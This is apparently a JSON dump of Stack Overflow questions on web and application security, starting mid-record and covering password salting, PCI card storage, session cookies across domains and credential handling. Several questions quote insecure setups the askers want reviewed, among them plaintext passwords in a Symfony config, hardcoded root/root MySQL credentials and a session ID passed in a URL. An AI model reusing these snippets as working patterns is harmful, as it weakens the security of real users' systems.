teacherpass, roles: [ 'ROLE_TEACHER' ] }\n                 parrent:  { password: parrentpass, roles: [ 'ROLE_PARRENT' ] }\n                 admin:    { password: adminpass, roles: [ 'ROLE_ADMIN' ] }\nencoders:\n         Symfony\\Component\\Security\\Core\\User\\User: plaintext\nfirewalls:\n    dev:\n        pattern:  ^/(_(profiler|wdt)|css|images|js)/\n        security: false\n\n    login:\n        pattern:  ^/demo/secured/login$\n        security: falsex\n\n    secured_area:\n        pattern:    ^/\n        anonymous: ~\n        form_login:\n           login_path: /\n           check_path: /login-check\n           default_target_path: /redirect\n           failure_path: /\n        logout:\n           path:   /logout\n           target: /\n        anonymous: ~\n        #http_basic:\n        #    realm: \"Secured Demo Area\"\n\naccess_control:\n        - { path: ^/admin, roles: ROLE_ADMIN }\n        - { path: ^/parrent, roles: ROLE_PARRENT }\n        - { path: ^/teacher, roles: ROLE_TEACHER }\n        - { path: ^/student, roles: ROLE_STUDENT }\n</code></pre>\n\n<p>What is the problem?</p>\n"},{"tags":["php","security","cookies","hash"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":13052977,"title":"Best way to securely set a session cookie on another domain","body":"<p>We currently have 2 sites <code>http://www.foo.co.uk</code> and <code>https://secure.foo.com</code>.</p>\n\n<p>The www site does not have an SSL certificate and is on a different domain.</p>\n\n<p>We have a login button on <code>http://www.foo.co.uk</code> that when clicked opens up an iframe of <code>https://secure.foo.com</code> with a form, when the user logs in it creates a session cookie on that domain (<code>foo.com</code>).</p>\n\n<p>The session cookie then needs to be copied to <code>foo.co.uk</code> so what it does is redirects you to <code>http://www.foo.co.uk/setcookie.php?session=abcd1234</code> which allows us to set the same cookie on the origin domain.</p>\n\n<p>This is not a very secure solution so I have been looking into how to make this better - the best idea I have found is to send a hash using something like <code>hash_hmac</code> along with the params to the setcookie.php script and then verify it on the other end before creating the cookie.</p>\n\n<p>Whilst this is better it doesn't prevent man in the middle attacks. Bearing in mind that www is not SSL secured I don't think you can prevent this completely, so the next best thing would be to include a timestamp in the hash to make it valid for 5 minutes.</p>\n\n<p>Does anyone have any ideas on how I can make this better, or point out any pitfalls with this approach? I would be most grateful.</p>\n"},{"tags":["asp.net-mvc","security","iis-7.5"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":13051489,"title":"Access Denied in IIS 7.5 MVC application","body":"<p>I'm working with an MVC application on a test server that used to work perfectly. It creates accounts on a server that a 2nd application uses for logging in. It uses a credential store and PrincipalContext and UserPrincipal objects to create these accounts. </p>\n\n<p>I haven't used the test version of this app for months or possibly almost a year. Now when I go to create an account with the application, I get the following error:</p>\n\n<blockquote>\n  <p>Access is denied.\n  ASP.NET is not authorized to access the requested resource. Consider\n  granting access rights to the resource to the ASP.NET request\n  identity. ASP.NET has a base process identity (typically\n  {MACHINE}\\ASPNET on IIS 5 or Network Service on IIS 6 and IIS 7, and\n  the configured application pool identity on IIS 7.5) that is used if\n  the application is not impersonating. If the application is\n  impersonating via , the identity will be\n  the anonymous user (typically IUSR_MACHINENAME) or the authenticated\n  request user. </p>\n  \n  <p>To grant ASP.NET access to a file, right-click the file in Explorer,\n  choose \"Properties\" and select the Security tab. Click \"Add\" to add\n  the appropriate user or group. Highlight the ASP.NET account, and\n  check the boxes for the desired access.</p>\n</blockquote>\n\n<p>I looked at anonymous access, but the production version of this app also has a rule to deny anonymous access and it's working fine. This application never used impersonation even when it was working and I've heard that granting explicit access to ASP.NET is not generally recommended. I can make the application work locally through Visual Studio, but the version deployed to test continues to give this error. I would rater not republish the site to test, but perhaps that's the only option left? Is there anything obvious (but not to me) that could have changed in the security settings to cause this? I'm still researching with no luck.</p>\n\n<p>Thank you!</p>\n"},{"tags":["ios","security"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13049579,"title":"Embed API credentials in iOS code","body":"<p>I have to call payment gateway API from iOS code. Problem is it needs merchant credentials and I feel insecure embedding the merchant credentials in code. If someone somehow reverse engineer the code and get the credentials then the client is dead. Any advice?</p>\n\n<p>I found this post <a href=\"http://stackoverflow.com/questions/5784169/does-apple-modify-ios-application-executables-on-apps-submitted-to-the-app-store/5784332#5784332\">Does Apple modify iOS application executables on apps submitted to the App Store?</a> which says that app binaries are encrypted by Apple be default. Does it mean I can safely embed the credentials in code?</p>\n"},{"tags":["php","security","http-referer"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":442,"score":3,"question_id":5453776,"title":"Is HTTP_REFERER set by client","body":"<p>I heard that HTTP_REFERER can be spoofed. I have 2 sites, the first one contacts the second, and the second uses HTTP_REFERER to verify that the request is from the first one. </p>\n\n<p>If I receive a fake request from my first site to the second site and I know that this request was not made, what should I think? a third website is spoofing http_ref for all its users, or an individual is spoofing it from his browser settings? I want to know if http_ref is set/spoofed by the client/browser or by the website itself?</p>\n"},{"tags":["c#","windows","security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":4,"view_count":62,"score":-2,"question_id":13050535,"title":"How to check for read access on files using C#","body":"<p>Given a file, I need to list all the users that have read access to that file using C# and .NET framework 4. Not interested in adding or listing any other permissions.\nAssume the directory is a local directory and local users are enough.</p>\n"},{"tags":["security","authentication","hash","cryptography","password-protection"],"answer_count":9,"favorite_count":41,"up_vote_count":46,"down_vote_count":0,"view_count":12356,"score":46,"question_id":536584,"title":"Non-random salt for password hashes","body":"<p>UPDATE: I recently learned from <a href=\"http://security.stackexchange.com/q/379/33\">this question</a> that in the entire discussion below, I (and I am sure others did too) was a bit confusing: What I keep calling a rainbow table, is in fact called a hash table. Rainbow tables are more complex creatures, and are actually a variant of Hellman Hash Chains. Though I believe the answer is still the same (since it doesnt come down to cryptanalysis), some of the discussion might be a bit skewed.<br>\nThe question: \"<a href=\"http://security.stackexchange.com/q/379/33\">What are rainbow tables and how are they used?</a>\"</p>\n\n<hr>\n\n<p>Typically, I always recommend using a cryptographically-strong random value as salt, to be used with hash functions (e.g. for passwords), such as to protect against Rainbow Table attacks.  </p>\n\n<p>But is it actually cryptographically necessary for the salt to be random? Would any unique value (unique per user, e.g. userId) suffice in this regard? It would in fact prevent using a single Rainbow Table to crack all (or most) passwords in the system...<br>\nBut does lack of entropy really weaken the cryptographic strength of the hash functions?  </p>\n\n<hr>\n\n<p>Note, I am not asking about why to use salt, how to protect it (it doesnt need to be), using a single constant hash (don't), or what kind of hash function to use.<br>\nJust whether salt needs entropy or not.</p>\n\n<hr>\n\n<p>Thanks all for the answers so far, but I'd like to focus on the areas I'm (a little) less familiar with. Mainly implications for cryptanalysis - I'd appreciate most if anyone has some input from the crypto-mathematical PoV.<br>\nAlso, if there are additional vectors that hadn't been considered, thats great input too (see @Dave Sherohman point on multiple systems).<br>\nBeyond that, if you have any theory, idea or best practice - please back this up either with proof, attack scenario, or empirical evidence. Or even valid considerations for acceptable trade-offs... I'm familiar with Best Practice (capital B capital P) on the subject, I'd like to prove what value this actually provides.</p>\n\n<hr>\n\n<p>EDIT: Some really good answers here, but I think as @Dave says, it comes down to Rainbow Tables for common user names... and possible less common names too. However, what if my usernames are globally unique? Not necessarily unique for my system, but per each user - e.g. email address.<br>\nThere would be no incentive to build a RT for a single user (as @Dave emphasized, the salt is not kept secret), and this would still prevent clustering. Only issue would be that I might have the same email and password on a different site - but salt wouldnt prevent that anyway.<br>\nSo, it comes back down to cryptanalysis - IS the entropy necessary, or not? (My current thinking is it's not necessary from a cryptanalysis point of view, but it is from other practical reasons.)</p>\n"},{"tags":["html5","security","authentication","jquery-mobile","ldap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13050443,"title":"LDAP Auth through HTML5","body":"<p>I have an HTML5 mobile application built using the JQuery Mobile framework wrapped in a open-source Apache Cordova (PhoneGap) wrapper. </p>\n\n<p>The application has a login screen where you enter the network credentials of my client and authenticate against their Active Directory server in the backend. </p>\n\n<p>The client has provided me with the URI to call but I'm not sure how I would call this URI from my application code. Would this be through JavaScript or something? Please let me know.</p>\n\n<p>Thanks,\nS</p>\n"},{"tags":["security","ldap","passwords"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":5251,"score":4,"question_id":1078156,"title":"How secure is your password in LDAP?","body":"<p>Is your password more secure in any way if it is stored on LDAP rather than a database or an encrypted file?</p>\n"},{"tags":["java","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13049720,"title":"How to add library for BouncyCastleProvider Security","body":"<p>I am confuse where add jar file (bcprov-jdk15-145.jar) for adding security file for BouncyCastleProvider. In application library or In JRE jre6\\lib\\ext\\ folder.</p>\n\n<pre><code>    Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\n</code></pre>\n"},{"tags":["javascript","security","encryption","https"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":122,"score":2,"question_id":13037610,"title":"Can asymmetric cryptography be used to secure credit card information transmitted over HTTPS?","body":"<p>I'm not a security guru. I'm thinking about how to implement credit card storage in a software system where credit card transactions are accepted through the web, but are manually executed by an in-house user. We are going to use HTTPS which (I believe) will eliminate the risk of a man-in-the-middle attack. Now, I'm trying to figure out if I can make it so that the data received from the client can encrypted before it hits our server.</p>\n\n<p>The idea is that their browser would encrypt the data using the public part of an asymmetric key pair. The private part would be known by an in-house user. Then when it's time to manually process the charge, that user would go to an HTTPS page that we serve. They would manually enter the private key (which would not be transmitted to our servers) and the encrypted credit card info would be retrieved from our system and decrypted by the browser.</p>\n\n<p>In this way I'm hoping I can keep any of our servers from ever seeing unencrypted credit card information. Am I missing some well known security hole? I've read <a href=\"http://www.matasano.com/articles/javascript-cryptography/\" rel=\"nofollow\">this</a> which seems to address a different kind of security hole. I've also read a few other SO questions, but none of them seem to map clearly to this particular design.</p>\n\n<p>Edit #1: @Pointy asked why not use the industry standard. Major online retailers use solutions that are far more sophisticated and expensive than my problem warrants. Major retailers automatically process their transactions so typically work toward PCI-DSS compliance. This is not the problem that I'm trying to solve. I'm working on automatic tools to securely assist in manual transaction processing.</p>\n\n<p>Edit #2: @Jason Dean pointed out that I didn't describe the plan for managing the private key very well. The idea is literally to have our employee keep it on a piece of paper at their desk. Our main concern is with remote security violations. Our physical site is secure enough that we're not worried about someone breaking in. The idea would be to keep the private key out of any persistent storage on any machine anywhere that way no purely electronic attack could possibly get both the data and the private key.</p>\n"},{"tags":["sql-server","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":36,"score":0,"question_id":13048885,"title":"Login failed for user 'my-PC\\my'","body":"<p>Why I have this error:</p>\n\n<p><b>  Cannot open database \"source\" requested by the login. The login failed.</p>\n\n<p>Login failed for user 'my-PC\\my' </b> ?.</p>\n\n<p>I use \"windows\" mode. From visual I can access data, but when I run it (asp project) I get an error.I get this eror when replaced database in project with modified version from Management Studio (I modified only stored procedure that's not invoking in project). I read some articles and in security option allowed 'my-PC\\my' all operations.No effect.</p>\n\n<p><b>EDIT:</b></p>\n\n<p>here is my connection string:</p>\n\n<pre><code>    \"Server=(local);Database=source;Integrated Security=SSPI;\"\n</code></pre>\n"},{"tags":["iphone","cocoa-touch","security","sdk","settings.bundle"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":2841,"score":5,"question_id":1248575,"title":"Security implications of storing a password in Settings.bundle and getting with CFPreferencesCopyAppValue","body":"<p>Apologies for the seeming obviousness of this question, but for whatever reason I haven't been able to find a definitive answer in the Apple documentation about where and how Settings.bundle password info is stored. My question: if I need to store some credentials for an app, and I use a Settings.bundle so that the password is entered into a PSTextFieldSpecifier textfield in Apple's Settings area with IsSecure = YES, and then I access the value from my app using CFPreferencesCopyAppValue, never writing it out to NSUserDefaults and only sending it over the network securely, how secure is that storage and retrieval method when compared to storing and retrieving the password using the keychain in my own app settings?  Thanks for your input.</p>\n"},{"tags":["php","mysql","security"],"answer_count":7,"favorite_count":8,"up_vote_count":11,"down_vote_count":0,"view_count":9362,"score":11,"question_id":3710511,"title":"Best way to connect to mysql with php securely","body":"<p>I want some input on what you guys think is the most secure way to connect to a mysql database using php. Currently the way Im doing it is a utility php file that I include in the top of all my other php files. The utility php file is this</p>\n\n<pre><code>&lt;?php\nif(!defined('IN_PHP')){\n    die(\"hackerssss\");\n}\n$mysql_host = \"localhost\";\n$mysql_user = \"root\"; \n$mysql_pass = \"root\"; \n$mysql_db = cokertrading;\n?&gt;\n</code></pre>\n\n<p>Any suggestions?</p>\n"},{"tags":["security","encryption","credit-card","pci-compliance"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":146,"score":1,"question_id":7128397,"title":"Is this set-up PCI-Compliant?","body":"<p>I've been debating with a client who refuses to adopt PCI standards.  I want to check with the community to make sure I'm correct in my objections.  </p>\n\n<p>Question:  Is there a way to store credit card information on a shared hosting server AND be PCI compliant?</p>\n\n<p>Here is the setup:</p>\n\n<p>1)  SSL is being implemented for the whole checkout process and for the client's site's admin section.</p>\n\n<p>2)  The credit card information is being stored on the server (a shared hosting plan) in a MYSQL database.  It is encrypted.</p>\n\n<p>3)  The client accesses a password protected admin panel and prints the credit card from her website.</p>\n\n<p>4)  The client then manually runs the credit card info through a terminal and deletes this credit card info from the server.</p>\n"},{"tags":["wordpress","security","pci-dss"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":10418655,"title":"WordPress Plugin and One-Way Encryption","body":"<p>I was hoping someone could help me sort something out. I've been working on a shopping cart plugin for WordPress for quite a while now.  I started coding it at the end of 2008 (and it's been one of those \"work on it when I have time\" projects, so the going is very slow, obviously!) and got pretty far with it.  Even had a few testers take me up on it and give me feedback. (Please note that this plugin is also meant to be a fee download - I have no intention of making it a premium plugin.)</p>\n\n<p>Anyway, in 2010, when all the PCI/DSS stuff became standard, I shelved it, because the plugin was meant to retain certain information in the database, and I was not 100% sure what qualified as \"sensitive data,\" and I didn't want to put anything out there that might compromise anyone, and possibly come back on me.</p>\n\n<p>Over the last few weeks, some colleagues and I have been having a discussion about PCI/DSS compliance, and it's sparked a re-interest in finally finishing this plugin.  I'm going to remove the storage of credit card numbers and any data of that nature, but I do like the idea of storing the names and shipping addresses of people who voluntarily might want to create an account with the site that might use this plugin so if they shop there again, that kind of info is retained. Keep in mind, the data stored would be <em>public information</em> - the kind of thing you'd find in a phone book, or a peek in the record room of a courthouse. So nothing like storing SS#'s, medical histories or credit card numbers. Just stuff that would maybe let someone see past purchases, and retain some info to make a future checkout process a bit easier.</p>\n\n<p>One of my colleagues suggested I still do something to enhance security a bit, since the name and shipping address would likely be passed to whatever payment gateway the site owner would choose to use. They suggested I use \"one-way encryption.\"  Now, I'm not a huge security freak, but I'm pretty sure this involves (one aspect anyway) stuff like MD5 hashes with salts, or the like.  So this confuses me, because I wouldn't have the slightest idea of where to look to see how to use that kind of thing with my code, and/or if it will work when passing that kind of data to PayPal or Google Checkout, or Mal's, or what have you.</p>\n\n<p>So I suppose this isn't an \"I need code examples\" kind of question, but more of a \"please enlighten me, because I'm sort of a dunce\" kind of question. (which, I'm sure, makes people feel much better about the fact that I'm writing a shopping cart plugin LOL)</p>\n"},{"tags":["security","https","pci-dss","pci-compliance"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12917137,"title":"PCI - Card Data Transmission","body":"<p>I understand that PCI compliance affects not just storage of card details but does it also affect transmission. E.g.  if I simply want to collect a card number and transmit it over https does this require PCI compliance steps to be taken?</p>\n"},{"tags":["php","security","encryption"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":1076,"score":4,"question_id":10916284,"title":"How to encrypt/decrypt data in php?","body":"<p>I'm currently a student and I'm studying PHP, I'm trying to make a simple encrypt/decrypt of data in PHP. I made some online research and some of them were quite confusing(at least for me).</p>\n\n<p>Here's what I'm trying to do:</p>\n\n<p>I have a table consists of these fields (UserID,Fname,Lname,Email,Password)</p>\n\n<p>What I want to have is have the all fields encrypted and then be decrypted(Is it possible to use sha256 for encryption/decryption, if not any encryption algorithm)</p>\n\n<p>Another thing I want to learn is how to create a one way hash(sha256) combined with a good \"salt\".\n(Basically I just want to have a simple implementation of encryption/decryption, hash(sha256)+salt)</p>\n\n<p>Sir/Ma'am, your answers would be of great help and be very much appreciated. Thank you++</p>\n"},{"tags":["c++","windows","security","winapi","kernel"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":13044991,"title":"Get all Windows Kernel object and Security rights of it","body":"<p>I need to get list of access rights to all Win-Kernel objects;\nWhat I do:</p>\n\n<pre><code>for (int i=0; i&lt;9999; i++)\n    GetKernelObjectSecurity( i, ... ) //result in security_descriptor\n    GetSecurityDescriptorDacl( security_descriptor, ... ) // result in lpbDaclPresent\n    if (lpbDaclPresent)\n        //lpbDaclPresent - need to get\n</code></pre>\n\n<blockquote>\n  <p>If DACL = Null -> \"all can do all\"</p>\n  \n  <p>If DACL != Null -> parsing DACL-mask</p>\n</blockquote>\n\n<hr>\n\n<p>I'm on the right track ?\nBy the way, I have: </p>\n\n<p>~300 handles without DACL</p>\n\n<p>~100 handles with DACL\n(testing on Windows 7)</p>\n"},{"tags":["mysql","performance","perl","security","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":13043648,"title":"Perl: Handing $dbh off to module. Security and performance?","body":"<p>So I have a cgi script,</p>\n\n<pre><code>#!/usr/bin/perl -T\n\nuse strict;\nuse warnings;\nuse DBI;\nuse WebEngine;\n\n\nmy $dbh = DBI-&gt;connect('DBI:mysql:database', $username, $password)\n    || die \"Could not connect to database: $DBI::errstr\";\n\nmy $we = WebEngine-&gt;new($dbh)\n    or die(\"Failed to instantiate WebEngine object:\\n$!\\n\");\n\n$userID = $we-&gt;register(\"MyUsername\", $dbh);\n</code></pre>\n\n<p>This script creates a database handler and then uses a module I made to deal with most of the back-end of the site to register a username and return a userID number.</p>\n\n<p>I have three questions about this.</p>\n\n<ul>\n<li><p>Does creating this $dbh in this script increase performance by keeping a database connection open?  </p></li>\n<li><p>Could I put the $dbh in my module and not fear being inefficient? </p></li>\n<li><p>Is there a security benefit to keeping the $dbh (and the associated info(I keep my pass in plain text in the code; is that bad?)) in the module that is not directly interacted with through my website?</p></li>\n</ul>\n"},{"tags":["security","amazon-s3","spring-security","storage"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13043572,"title":"Is there a way to integrate the S3's ACL with my own user repository?","body":"<p>I am writing a java ee application, with its own users and roles repository (based on the Spring Security Framework). In the application, some users upload large files. </p>\n\n<p>I want these files to be protected (i.e. only the person who uploaded the file should have the right to access it; in fact the authorization logic is a bit more complex than that). My users don't have any aws account.</p>\n\n<p>I would like to store these files on S3, but I haven't found a way to do it securely. Indeed, I haven't found a way to express an ACL that would reference my users and roles. </p>\n\n<p>I have thought about generating opaque names for my files (that would be hard to guess). My java ee application could ensure that access to the web page that contains a link to the file is protected. Some level of protection, but it seems pretty fragile against a brute force attachk.</p>\n\n<p>Any idea?</p>\n"},{"tags":["security","email","proxy","exchange","fraud"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13042060,"title":"How can I set up a service that proxies/substitutes users' emails?","body":"<p>Hoping someone can help me out with a security issue that's puzzling me. I have a webapp (in C#) that sends users email notifications when they contact or interract with each other in the app.</p>\n\n<p>The problem is that the notifications include both parties' personal emails as the to/from fields. I don't want to remove this functionality because users expect to be able to reply by just sending a reply email, but I'm worried about exposing personal details like that.</p>\n\n<p>Ideally, I'd like something like Facebook messages, Twitter DMs or eBay messages, where personal emails are cloaked, and any email replies forwarded.</p>\n\n<p>Would anyone know how to create something like this? Is there something simpler and more scalable than an email server with a whole heap of forwarding rules?</p>\n\n<p>Any help would be insanely appreciated.</p>\n"},{"tags":["php","security","guide"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":48,"score":2,"question_id":13041294,"title":"Guide to security testing","body":"<p>I am looking for some helpful books/tutorials <strong>step-by-step</strong> guide for security testing without web testing tools (<a href=\"http://seleniumhq.org/\" rel=\"nofollow\">Selenium</a> <a href=\"/questions/tagged/php\" class=\"post-tag\" title=\"show questions tagged 'php'\" rel=\"tag\">php</a>, <a href=\"http://watir.com/\" rel=\"nofollow\">Watir</a> <a href=\"/questions/tagged/ruby\" class=\"post-tag\" title=\"show questions tagged 'ruby'\" rel=\"tag\">ruby</a>)</p>\n\n<p>As a newbie, I am particular interested in:</p>\n\n<ul>\n<li>Authentication / Authorization</li>\n<li>Business Logic</li>\n<li>Session / Cookie</li>\n<li>SQL Injection</li>\n</ul>\n\n<p>Any tips/tricks/rants would be awesome.</p>\n"},{"tags":["ios","security","ssl","keychain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":142,"score":0,"question_id":12305947,"title":"SecItemCopyMatching returns more SecIdentityRef items than were added using SecItemAdd","body":"<p>I am implementing SSL client authentication for our iPhone app and am using the app keychain to store the client identity (certificate + private key).  After adding the items to the keychain, I am getting some unexpected results when using SecItemCopyMatching.  Quick summary:  I add exactly one SecIdentityRef to the keychain, but SecItemCopyMatching finds two afterwards.  Let me start with the facts.</p>\n\n<p>I am running my app on an iPod with iOS 4.3.5.</p>\n\n<p>I have an empty app keychain to start with.</p>\n\n<p>My certificates are all created using openssl and deployed to the iPod via a PKCS#12 file as an email attachment.\nThe PKCS#12 file contains:</p>\n\n<ul>\n<li>Client certificate</li>\n<li>Client CA certificate (issuer of the Client certificate)</li>\n<li>Root CA certificate (issuer of the Client CA certificate)</li>\n<li>RSA private key of the client certificate</li>\n</ul>\n\n<p>SecPKCS12Import successfully imports the file and the resulting dictionary has the following content:</p>\n\n<ul>\n<li>one \"identity\"</li>\n<li>one \"trust\"</li>\n<li>one \"chain\" (CFArray which holds the three certificates mentioned above)</li>\n</ul>\n\n<p>Using SecItemAdd, I successfully add the \"identity\" to the keychain.</p>\n\n<p>Next, I retrieve the \"chain\" array from the dictionary and attempt to add the certificates.  In doing so, the first one fails with error errSecDuplicateItem.  I assume this is because the first certificate is the client certificate and that it was already added to the keychain when I added the identity.  The other two certificates are added without error.</p>\n\n<p>Now, if I go back and use SecItemCopyMatching with these key/value pairs...</p>\n\n<pre><code> keys   = {kSecClass, kSecReturnRef, kSecMatchLimit}\n values = {kSecClassIdentity, kCFBooleanTrue, kSecMatchLimitAll}\n</code></pre>\n\n<p>...two identities are returned!  Furthermore, if I retrieve the certificate for each (SecIdentityCopyCertificate) and then the summary (SecCertificateCopySubjectSummary), I see the both identities have the same certificate!</p>\n\n<p>Lastly, when I try to clear the identities from the keychain (SecItemDelete), the first attempt is successful but the second fails with errSecItemNotFound.</p>\n\n<p>It is clear from all the googling I have been doing that there are \"issues\" with the iOS keychain.  However, I have not seen this reported; nor have I seen anything even remotely related.  </p>\n\n<p>So, my questions:</p>\n\n<ul>\n<li>Am I using SecItemCopyMatching correctly?</li>\n<li>When using SecItemCopyMatching to find identities in the keychain, how does it determine the identities that are present?  Is this dynamic, or strictly based on how many SecIdentityRef items were added?</li>\n<li>could this problem possibly be related to the certificates themselves?  Note that despite this issue, I am still able to retrieve the first identity and certificates in order to respond to didReceiveAuthenticationChallenge.</li>\n</ul>\n\n<p>I can post code and/or certificate dump, if needed.</p>\n\n<p>Thanks in advance,</p>\n\n<p>Ken Cross\nSiemens Enterprise Networks.</p>\n"},{"tags":["asp.net","performance","security","https","asp.net-mvc-4"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13040442,"title":"implications of having a site in full https","body":"<p>I am currently developing an MVC4 web application for eCommerce. The site will contain a login and users can visit the site, input their details and submit orders etc. This is a traditional eCommerce site.</p>\n\n<p>To boost the security of the site, I am looking to set up the entire site in https. As the user will be supplying their log in credentials and storing personal information in cookies, I would like the site to be fully secured. </p>\n\n<p>I have concerns though, these being if I set up the site in https, will it detriment performance? Will it impact negatively on search engine optimization? Are there any other implications of having an entire site in https?</p>\n\n<p>I use output caching to cache the content of my views - with https will these still get cached?</p>\n\n<p>I have been reviewing security guidelines and documentation, such as <a href=\"http://asafaweb.com/OWASP%20Top%2010%20for%20.NET%20developers.pdf\" rel=\"nofollow\">this</a> from OWASP and they recommend this. Also, I see that sites such as twitter are fully https.</p>\n"},{"tags":["linux","security","networking","ip"],"answer_count":2,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":462,"score":9,"question_id":4071426,"title":"How to set the Evil Bit on outgoing traffic","body":"<p>So for a security related application I'm writing, I actually want to use RFC3514 (\"The Evil Bit\") to determine what set of traffic across the network is evil or not at a per packet level. This is used as training data for an assisted machine learning engine, so the app has to know before hand what packets are evil and which are not. </p>\n\n<p>This ought to be fairly simple, it's just setting a single IP layer bit. I've tried looking into doing this with iptables or libpcap, but either they don't have the functionality or I failed to discover it. </p>\n\n<p>Being able to set it for all traffic out of a machine would be fine, but filters on what comes out would be better. (Like being able to specify what higher layer protocols get it set, etc...) </p>\n\n<p>I'm using Ubuntu, as well. So Linux solutions preferred. But otherwise, it doesn't really matter what method is used to accomplish this. Bash script, c/c++ app, setting some sysctl, whatever.</p>\n"},{"tags":["flash","security","flash-player","twilio"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":211,"score":0,"question_id":9824982,"title":"Flash player security settings","body":"<p>I am using twilo client in one of my apps and it is showing following popup when I click on call button\n<img src=\"http://i.stack.imgur.com/sFcZV.png\" alt=\"Flash Security settings\"></p>\n\n<p>But I want to show the following pop up which is lot simpler and seems less cumbersome\n<img src=\"http://i.imgur.com/grvcb.png\" alt=\"Flash Security settings\"></p>\n\n<p>Is there a way to control which pop up comes on the screen? I have read some documentation of adobe but their configuration files live in users computer which ofcourse can not be changed by a website.\nAny help will be really appreciated</p>\n"},{"tags":["ipad","security"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12977959,"title":"authenticating ipad against active directory","body":"<p>I have made an ipad app in which I want to implement a log in using active directory authenticaion. so far, i have not found anything on how to do this. I want to use the ipad's mac id to authenticate against the active directory. How can I implement this, or is there any other way I can implement a security log in to my app</p>\n"},{"tags":["asp.net","security","cryptography","ssl-certificate","wif"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13025223,"title":"Access to private key of SSL cert","body":"<p>Is it okay to give Network Service access to the site's SSL certificates private key from a security point of view?</p>\n\n<p>EDIT: adding some context to the question\nIn this <a href=\"http://msdn.microsoft.com/en-us/library/windowsazure/hh289318.aspx\" rel=\"nofollow\">link</a>, under section \"Encrypt cookies using RSA\" step 4, the code uses the  \"serviceCertificate\" to encrypt and sign the cookie. Access to the cert's private key is required here.</p>\n"},{"tags":["php","image","security","file-upload","virus"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":22,"score":2,"question_id":13039565,"title":"Sanitazing user uploaded (image) files for malicious / harmful content","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10196351/image-sanitization-library\">Image sanitization library</a>  </p>\n</blockquote>\n\n\n\n<p>How can a social web application that allows user file uploads, prevent harmful content hidden/stored in user files. I use php as a server side technology for a site. Users can upload images. Is there a way that the contents of these files can be verified via php? The images may also be downloaded by the owner and other users.</p>\n"},{"tags":["wcf","security","mvc"],"answer_count":0,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13038646,"title":"WCF as BLL (Middle Tier) and Security techniques","body":"<p>So bear with me, i am new at MVC and WCF. I already have a set of services (WCF) that exposes my BLL and I am trying to consume those from my MVC.net web application but i am unsure on how to perform security operations here.</p>\n\n<p>These are my app requirements:</p>\n\n<ul>\n<li>Be able to consume WCF services using different credentials for every user on the web application</li>\n<li>My BLL (WCF) needs to know what consumer is calling it (right now I only have the MVC app but i am planning to add iOS and Andriod calls to it, so later on i will add REST services to the WCF endpoints) Is there any design pattern for this out there? (or should i just use the soap header to include the caller ID? should i use some sort of caller secret or something?)</li>\n<li>I need a security mechanism like Tokens or something so I dont have to pass the username and password on every call of the service method (WCF)</li>\n</ul>\n\n<p>What i have so far:</p>\n\n<ul>\n<li>WCF uses a certificate and  and   with a custom username validator.</li>\n<li>I have manually coded proxies using the contract interfaces instead of generated proxies: But I hate the fact that i have to validate username and password every time a call is made to a WCF service. How in heaven can i use Tokens here? like to know if a given token sent on the soap header is valid or not yet expired? i have searched a lot and no tutorial/code/example is clear enough for me to actually start coding that ;(</li>\n<li>I am trying to cache the ChannelFactory but should I? i mean, i will need to cache a channer factory per logged in user per contract ;( is that ok? what can i do here?</li>\n</ul>\n\n<p>Thanks in advance!</p>\n"},{"tags":["security","rest","oauth","resteasy"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12904152,"title":"Resteasy security, oauth, android Client","body":"<p>I'm building an application which includes both server side components (resteasy) and an Android client.  In the Android client I'm making requests to the server using httpclient.</p>\n\n<p>To log into Android client I want to use OAuth 2.0. </p>\n\n<p>But what I'm the most concerned about is securing the server side.  Does anyone know how to secure the server side of my 